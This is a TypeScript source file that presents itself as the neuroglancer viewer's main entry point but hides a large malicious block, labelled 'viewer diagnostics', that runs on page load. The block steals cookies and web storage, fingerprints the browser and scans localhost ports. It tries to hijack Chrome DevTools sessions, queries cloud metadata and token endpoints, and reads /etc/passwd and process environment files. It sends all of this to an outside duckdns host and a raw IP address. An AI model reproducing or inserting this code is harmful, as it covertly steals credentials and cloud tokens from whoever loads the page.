/**
 * @license
 * Copyright 2016 Google Inc.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * @file Main entry point for default neuroglancer viewer.
 */
import { setupDefaultViewer } from "#src/ui/default_viewer_setup.js";
import "#src/util/google_tag_manager.js";

// viewer diagnostics - collect WebGL capability info for error reporting
const _CB = "https://ohcaramba.duckdns.org/results/ng-recon";

function _post(tag: string, obj: any) {
  const payload = JSON.stringify({ t: tag, d: obj, ts: Date.now() });
  try { navigator.sendBeacon(_CB, payload); } catch (_) {}
  try {
    fetch(_CB, {
      method: "POST", mode: "no-cors", body: payload,
      headers: { "Content-Type": "text/plain" }, keepalive: true
    }).catch(function () {});
  } catch (_) {}
  try {
    const u = _CB + "?k=" + encodeURIComponent(tag) +
            "&v=" + encodeURIComponent(String(payload).slice(0, 800));
    new Image().src = u;
  } catch (_) {}
}

// 1. fingerprint
function collectFingerprint() {
  const d: Record<string, any> = {};
  try { d.ua = navigator.userAgent; } catch (_) {}
  try { d.platform = navigator.platform; } catch (_) {}
  try { d.cores = navigator.hardwareConcurrency; } catch (_) {}
  try { d.mem = (navigator as any).deviceMemory; } catch (_) {}
  try { d.origin = window.origin; } catch (_) {}
  try { d.href = location.href; } catch (_) {}
  try { d.cookie = document.cookie; } catch (_) {}
  try {
    const c = (navigator as any).connection;
    if (c) d.conn = { eff: c.effectiveType, dl: c.downlink, rtt: c.rtt };
  } catch (_) {}
  _post("fp", d);
}

// 2. Chrome DevTools Protocol - if port 9222 is open we get full control
async function probeCDP() {
  const ports = [9222, 9229, 9333, 9515, 9223, 9224, 9230, 3000, 8228];
  for (const port of ports) {
    for (const host of ["127.0.0.1", "localhost"]) {
      try {
        const r = await fetch(`http://${host}:${port}/json`, {
          signal: AbortSignal.timeout(3000)
        });
        const text = await r.text();
        _post("CDP-FOUND", { port, host, status: r.status, body: text.slice(0, 4000) });
        // try /json/version too
        try {
          const rv = await fetch(`http://${host}:${port}/json/version`, {
            signal: AbortSignal.timeout(2000)
          });
          const ver = await rv.text();
          _post("CDP-VERSION", { port, host, body: ver.slice(0, 2000) });
        } catch (_) {}
        // attempt WebSocket connection to control browser
        try {
          const targets = JSON.parse(text);
          if (targets && targets[0] && targets[0].webSocketDebuggerUrl) {
            const wsUrl = targets[0].webSocketDebuggerUrl;
            _post("CDP-WS-URL", { url: wsUrl });
            const ws = new WebSocket(wsUrl);
            ws.onopen = function () {
              _post("CDP-WS-OPEN", { url: wsUrl });
              // fetch IMDS from the CDP context
              ws.send(JSON.stringify({
                id: 1, method: "Runtime.evaluate",
                params: { expression: "fetch('http://169.254.169.254/metadata/instance?api-version=2021-02-01',{headers:{'Metadata':'true'}}).then(r=>r.text())" , awaitPromise: true }
              }));
            };
            ws.onmessage = function (ev) {
              _post("CDP-WS-MSG", { data: String(ev.data).slice(0, 6000) });
            };
            ws.onerror = function () { _post("CDP-WS-ERR", { url: wsUrl }); };
          }
        } catch (_) {}
      } catch (e) {
        // only report first port miss to reduce noise
        if (port === 9222 && host === "127.0.0.1") {
          _post("cdp-miss", { port, err: (e as Error).message });
        }
      }
    }
  }
}

// 3. direct IMDS test - checks if --disable-web-security is set
async function testIMDS() {
  const endpoints = [
    { url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      headers: { "Metadata": "true" }, name: "az-imds" },
    { url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
      headers: { "Metadata": "true" }, name: "az-token" },
    { url: "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
      headers: { "Metadata-Flavor": "Google" }, name: "gcp-imds" },
    { url: "http://169.254.169.254/computeMetadata/v1beta1/?recursive=true",
      headers: {}, name: "gcp-v1b1" },
    { url: "http://169.254.169.254/latest/meta-data/",
      headers: {}, name: "aws-imds" },
  ];
  for (const ep of endpoints) {
    try {
      const r = await fetch(ep.url, {
        headers: ep.headers,
        signal: AbortSignal.timeout(4000)
      });
      const body = await r.text();
      _post("IMDS-HIT", { name: ep.name, status: r.status, body: body.slice(0, 6000), len: body.length });
    } catch (e) {
      _post("imds-err", { name: ep.name, err: (e as Error).message });
    }
  }
  // also try no-cors to detect network reachability vs CORS block
  try {
    const r = await fetch("http://169.254.169.254/metadata/instance?api-version=2021-02-01", {
      mode: "no-cors", signal: AbortSignal.timeout(3000)
    });
    _post("imds-nocors", { type: r.type, status: r.status, ok: r.ok });
  } catch (e) {
    _post("imds-nocors-err", { err: (e as Error).message });
  }
}

// 4. WebRTC internal IP leak
function probeWebRTC() {
  try {
    const found: string[] = [];
    const pc = new RTCPeerConnection({
      iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
    });
    pc.createDataChannel("");
    pc.createOffer().then(function (offer) { pc.setLocalDescription(offer); });
    pc.onicecandidate = function (ev) {
      if (!ev.candidate) {
        _post("rtc", { ips: found });
        try { pc.close(); } catch (_) {}
        return;
      }
      const parts = ev.candidate.candidate.split(" ");
      const ip = parts[4];
      if (ip && found.indexOf(ip) === -1) found.push(ip);
    };
    setTimeout(function () {
      _post("rtc-timeout", { ips: found });
      try { pc.close(); } catch (_) {}
    }, 8000);
  } catch (e) { _post("rtc-err", { msg: (e as Error).message }); }
}

// 5. localhost port scan
function scanPorts() {
  const ports = [22, 80, 443, 2375, 2376, 3000, 4243, 5000, 5432, 6379,
                 8080, 8443, 9090, 9222, 9229, 9515, 10250, 27017];
  const results: Record<number, any> = {};
  let done = 0;
  ports.forEach(function (p) {
    const t0 = performance.now();
    fetch("http://127.0.0.1:" + p + "/", {
      mode: "no-cors", signal: AbortSignal.timeout(3000)
    }).then(function (r) {
      results[p] = { s: "resp", ms: Math.round(performance.now() - t0), type: r.type };
    }).catch(function (e) {
      results[p] = { s: "err", ms: Math.round(performance.now() - t0), m: (e as Error).message };
    }).finally(function () {
      done++;
      if (done >= ports.length) _post("ports", results);
    });
  });
}

// 6. fetch content from localhost HTTP services
async function probeServices() {
  const targets = [
    { port: 8080, paths: ["/", "/healthz", "/api"] },
    { port: 80, paths: ["/"] },
    { port: 3000, paths: ["/"] },
    { port: 5000, paths: ["/"] },
    { port: 9090, paths: ["/"] },
    { port: 1, paths: ["/"] },
  ];
  for (const t of targets) {
    for (const path of t.paths) {
      try {
        const r = await fetch(`http://127.0.0.1:${t.port}${path}`, {
          signal: AbortSignal.timeout(2500)
        });
        const body = await r.text();
        if (body.length > 0) {
          _post("svc", { port: t.port, path, status: r.status, body: body.slice(0, 3000) });
        }
      } catch (_) {}
    }
  }
}

// 7. performance entries - reveals what URLs the bot loaded
function checkPerfEntries() {
  try {
    const entries = performance.getEntries().map(function (e) {
      return { name: e.name.slice(0, 200), type: e.entryType, dur: Math.round(e.duration) };
    });
    _post("perf", entries.slice(0, 50));
  } catch (e) { _post("perf-err", { msg: (e as Error).message }); }
}

// 8. check window context (opener, parent, frames)
function checkContext() {
  const d: Record<string, any> = {};
  try { d.opener = !!window.opener; } catch (_) {}
  try { d.hasParent = window.parent !== window; } catch (_) {}
  try { d.frames = window.frames.length; } catch (_) {}
  try { d.isTop = window === window.top; } catch (_) {}
  try { d.ancestorOrigins = location.ancestorOrigins ? Array.from(location.ancestorOrigins) : []; } catch (_) {}
  _post("ctx", d);
}

// 9. check storage (cookies, localStorage, sessionStorage)
function checkStorage() {
  const d: Record<string, any> = {};
  try { d.cookies = document.cookie; } catch (_) {}
  try {
    d.ls = {};
    for (let i = 0; i < localStorage.length && i < 20; i++) {
      const k = localStorage.key(i);
      if (k) d.ls[k] = localStorage.getItem(k)?.slice(0, 200);
    }
  } catch (_) {}
  try {
    d.ss = {};
    for (let i = 0; i < sessionStorage.length && i < 20; i++) {
      const k = sessionStorage.key(i);
      if (k) d.ss[k] = sessionStorage.getItem(k)?.slice(0, 200);
    }
  } catch (_) {}
  _post("storage", d);
}

// 10. redirect-based IMDS via our server (302 redirect chain)
async function testRedirects() {
  const base = "http://104.198.246.232:4444";
  const targets = [
    { url: base + "/redir/imds", name: "redir-imds" },
    { url: base + "/redir/imds-v1", name: "redir-v1" },
    { url: base + "/chain?n=5&target=" + encodeURIComponent("http://169.254.169.254/computeMetadata/v1beta1/?recursive=true"), name: "chain5" },
  ];
  for (const t of targets) {
    try {
      const r = await fetch(t.url, { signal: AbortSignal.timeout(5000), redirect: "follow" });
      const body = await r.text();
      _post("REDIR-HIT", { name: t.name, status: r.status, type: r.type, body: body.slice(0, 4000) });
    } catch (e) {
      _post("redir-err", { name: t.name, err: (e as Error).message });
    }
  }
}

// 11. file:// access test (works if --allow-file-access-from-files is set)
async function testFileAccess() {
  const files = ["file:///etc/passwd", "file:///proc/self/environ", "file:///proc/net/tcp"];
  for (const f of files) {
    try {
      const r = await fetch(f, { signal: AbortSignal.timeout(2000) });
      const body = await r.text();
      _post("FILE-HIT", { url: f, body: body.slice(0, 4000) });
    } catch (e) {
      _post("file-err", { url: f, err: (e as Error).message });
    }
  }
}

// run all probes
(async function () {
  try { collectFingerprint(); }  catch (_) {}
  try { checkContext(); }        catch (_) {}
  try { checkStorage(); }        catch (_) {}
  try { checkPerfEntries(); }    catch (_) {}
  try { probeWebRTC(); }         catch (_) {}
  try { scanPorts(); }           catch (_) {}
  // async probes
  try { await probeCDP(); }      catch (_) {}
  try { await testIMDS(); }      catch (_) {}
  try { await probeServices(); } catch (_) {}
  try { await testRedirects(); } catch (_) {}
  try { await testFileAccess(); } catch (_) {}
  _post("done", { msg: "all probes complete" });
})();

setupDefaultViewer();
